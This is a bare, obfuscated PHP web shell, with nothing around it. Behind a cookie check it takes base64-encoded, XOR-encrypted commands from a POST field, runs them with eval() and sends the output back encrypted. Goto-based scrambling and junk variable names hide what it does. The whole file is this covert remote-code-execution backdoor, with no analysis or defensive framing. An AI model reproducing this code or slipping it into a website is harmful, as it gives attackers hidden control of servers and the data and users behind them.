<?php 
if (!isset($_POST['data'])) { goto aJU; } if ($_COOKIE['auth_token'] == '<HASH>') { goto aPe; } http_response_code(403); goto JGF; aPe: $Iit = base64_decode($_POST['data']); $Nhm = '<KEY>'; $o0u = ''; $uwW = 0; cHI: if (!($uwW < strlen($Iit))) { goto DgU; } $o0u .= $Iit[$uwW] ^ $Nhm[$uwW % strlen($Nhm)]; lw8: $uwW++; goto cHI; DgU: ob_start(); eval($o0u); $Sm5 = ob_get_clean(); $eWH = ''; $uwW = 0; Vt6: if (!($uwW < strlen($Sm5))) { goto P6u; } $eWH .= $Sm5[$uwW] ^ $Nhm[$uwW % strlen($Nhm)]; Kyr: $uwW++; goto Vt6; P6u: $L0V = base64_encode($eWH); echo $L0V; JGF: aJU:
?>